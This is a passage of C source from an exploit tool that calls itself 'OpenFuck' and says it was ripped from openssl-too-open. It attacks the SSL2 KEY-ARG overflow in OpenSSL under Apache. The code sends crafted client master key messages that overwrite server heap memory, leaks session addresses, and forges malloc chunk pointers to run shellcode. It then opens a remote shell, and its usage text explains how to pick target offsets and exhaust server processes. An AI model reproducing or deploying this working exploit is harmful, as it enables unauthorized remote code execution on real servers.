	EVP_PKEY *pkey=NULL;

	unsigned char buf[BUFSIZE] =
		"\x02"			/* client master key message */
		"\x01\x00\x80"	/* cipher kind */
		"\x00\x00"		/* clear key length */
		"\x00\x40"		/* encrypted key length */
		"\x00\x08";		/* key arg length */

	p = &buf[10];

	/* generate a 128 byte master key */
	for (i = 0; i < RC4_KEY_LENGTH; i++) {
		ssl->master_key[i] = (unsigned char) (rand() >> 24);
	}

	pkey=X509_get_pubkey(ssl->x509);
	if (!pkey) {
		printf("send client master key: No public key in the server certificate\n");
		exit(1);
	}

	if (pkey->type != EVP_PKEY_RSA) {
		printf("send client master key: The public key in the server certificate is not a RSA key\n");
		exit(1);
	}

	/* Encrypt the client master key with the server public key and put it in the packet */
	encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa,
RSA_PKCS1_PADDING);
	if (encrypted_key_length <= 0) {
		printf("send client master key: RSA encryption failure\n");
		exit(1);
	}

	p += encrypted_key_length;

	if (key_arg_overwrite) {
		/* These 8 bytes fill the key arg array on the server */
		for (i = 0; i < 8; i++) {
			*(p++) = (unsigned char) (rand() >> 24);
		}
		/* This overwrites the data following the key arg array */
		memcpy(p, key_arg_overwrite, key_arg_overwrite_len);

		key_arg_length = 8 + key_arg_overwrite_len;
	}
	else {
		key_arg_length = 0;	/* RC4 doesn't use KEY-ARG */
	}

	p = &buf[6];
	s2n(encrypted_key_length, p);
	s2n(key_arg_length, p);

	record_length = 10 + encrypted_key_length + key_arg_length;
	send_ssl_packet(ssl, buf, record_length);

	/* all following messages should be encrypted */
	ssl->encrypted = 1;
}

/* Generate the key material using the algorithm described in the SSL2 specification */
void generate_key_material(ssl_conn* ssl)
{
	unsigned int i;
	MD5_CTX ctx;
	unsigned char *km;
	unsigned char c='0';

	km=ssl->key_material;
	for (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {
		MD5_Init(&ctx);

		MD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);
		MD5_Update(&ctx,&c,1);
		c++;
		MD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);
		MD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);
		MD5_Final(km,&ctx);
		km+=MD5_DIGEST_LENGTH;
	}
}

/* Generate the RC4 session read and write keys */
void generate_session_keys(ssl_conn* ssl)
{
	generate_key_material(ssl);

	ssl->read_key = &(ssl->key_material[0]);
	ssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);

	ssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);
	ssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
}

/* Get a SERVER VERIFY response from the server */
void get_server_verify(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;

	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&buf[1])));
		exit(1);
	}
	if (len != 1 + CHALLENGE_LENGTH) {
		printf("get server verify: Malformed packet size\n");
		exit(1);
	}

	if (buf[0] != SSL2_MT_SERVER_VERIFY) {
		printf("get server verify: Expected SSL2 MT SERVER VERIFY, got %x\n", (int)buf[0]);
		exit(1);
	}

	/* If this works, our decryption key is correct */
	if (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) {
		printf("get server verify: Challenge strings don't match\n");
		exit(1);
	}
}

/* Send a CLIENT FINISHED message to the server */
void send_client_finished(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];

	buf[0] = SSL2_MT_CLIENT_FINISHED;
	memcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);

	send_ssl_packet(ssl, buf, 1+ssl->conn_id_length);
}

/* Get a SERVER FINISHED message from the server */
void get_server_finished(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;
	int i;

	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&buf[1])));
		exit(1);
	}
	if (buf[0] != SSL2_MT_SERVER_FINISHED) {
		printf("get server finished: Expected SSL2 MT SERVER FINISHED, got %x\n", (int)buf[0]);
		exit(1);
	}

	if (len <= 112 /*17*/) {
		printf("This server is not vulnerable to this attack.\n");
		exit(1);
	}
	cipher = *(int*)&buf[101];
	ciphers = *(int*)&buf[109];

	printf("cipher: 0x%x   ciphers: 0x%x\n", cipher, ciphers);
}

void get_server_error(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;

	if ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) {
		printf("get server finished: Expected SSL2 MT ERROR, got %x\n", (int)buf[0]);
		exit(1);
	}
}

void usage(char* argv0)
{
	int i;

	printf(": Usage: %s target box [port] [-c N]\n\n", argv0);
	printf("  target - supported box eg: 0x00\n");
	printf("  box - hostname or IP address\n");
	printf("  port - port for ssl connection\n");
	printf("  -c open N connections. (use range 40-50 if u dont know)\n");
	printf("  \n\n");
	printf("  Supported OffSet:\n");

	for (i=0; i<=MAX_ARCH; i++) {
		printf("\t0x%02x - %s\n", i, architectures[i].desc);
	}
	printf("\nFuck to all guys who like use lamah ddos\n");

	exit(1);
}

/* run, code, run */
int main(int argc, char* argv[])
{
	char* host;
	int port = 443;
	int i;
	int arch;
	int N = 0;
	ssl_conn* ssl1;
	ssl_conn* ssl2;

	printf("\n");
	printf("****************************************************************************\n");
	printf("*            OpenFuck v 2.5.0.2      ripped from openssl-too-open          *\n");
	printf("****************************************************************************\n");
	printf("                  * If U know more offset please contact us *\n");
        printf("                  *                                         *\n");
	printf("****************************************************************************\n");
        printf("*        offset by SPABAM   added LSD shellcode                            *\n");
        printf("*                                                     #highsecure          *\n");
	printf("* TNX special 2 #uname and #hackarena #SilverLords #isotk #BloodBR         *\n");
	printf("* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam          *\n");
	printf("* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ          *\n");
	printf("****************************************************************************\n");
	printf("\n");

	if ((argc < 3) || (argc > 6))
		usage(argv[0]);

	/* pff... use getopt next time, fool */

	sscanf(argv[1], "0x%x", &arch);
	if ((arch < 0) || (arch > MAX_ARCH))
		usage(argv[0]);

	host = argv[2];

	if (argc == 4)
		port = atoi(argv[3]);
	else if (argc == 5) {
		if (strcmp(argv[3], "-c"))
			usage(argv[0]);
		N = atoi(argv[4]);
	}
	else if (argc == 6) {
		port = atoi(argv[3]);
		if (strcmp(argv[4], "-c"))
			usage(argv[0]);
		N = atoi(argv[5]);
	}

	srand(0x31337);

	/* Open N connections before sending the shellcode. Hopefully this will
	   use up all available apache children and the shellcode will be handled
	   by a freshly spawned one */

	for (i=0; i<N; i++) {
		printf("\rConnection... %d of %d", i+1, N);
		fflush(stdout);
		connect_host(host, port);
		usleep(100000);
	}

	if (N) printf("\n");

	/* Establish the first connection. Overwrite session id length, and read
	   the session contents in the SERVER FINISHED packet. We need the cipher
	   and ciphers variables from the session structure to make the shellcode
	   work */

	printf("Establishing SSL connection\n");
	ssl1 = ssl_connect_host(host, port);
	ssl2 = ssl_connect_host(host, port);

	send_client_hello(ssl1);
	get_server_hello(ssl1);
	send_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);
	generate_session_keys(ssl1);
	get_server_verify(ssl1);
	send_client_finished(ssl1);
	get_server_finished(ssl1);

	/* The second connection uses the ciphers variable to get the shellcode
	   address and sends the shellcode to server */

	printf("Ready to send shellcode\n");

	port = get_local_port(ssl2->sock);
	overwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);
	overwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);

	/* We must overwrite s->session->cipher with its original value */
	*(int*)&overwrite_next_chunk[156] = cipher;

	/* The fd and bk pointers of the fake malloc chunk */
	*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;
	*(int*)&overwrite_next_chunk[196] = ciphers + 16;	/* shellcode address */

	send_client_hello(ssl2);
	get_server_hello(ssl2);

	send_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);
	generate_session_keys(ssl2);
	get_server_verify(ssl2);

	/* overwrite the connection id with random bytes, causing the server to abort the connection */
	for (i = 0; i < ssl2->conn_id_length; i++) {
		ssl2->conn_id[i] = (unsigned char) (rand() >> 24);
	}
	send_client_finished(ssl2);
	get_server_error(ssl2);

	printf("Spawning shell...\n");

	sleep(1);

	sh(ssl2->sock);

	close(ssl2->sock);
	close(ssl1->sock);

	return 0;
}

/* It isn't 0day */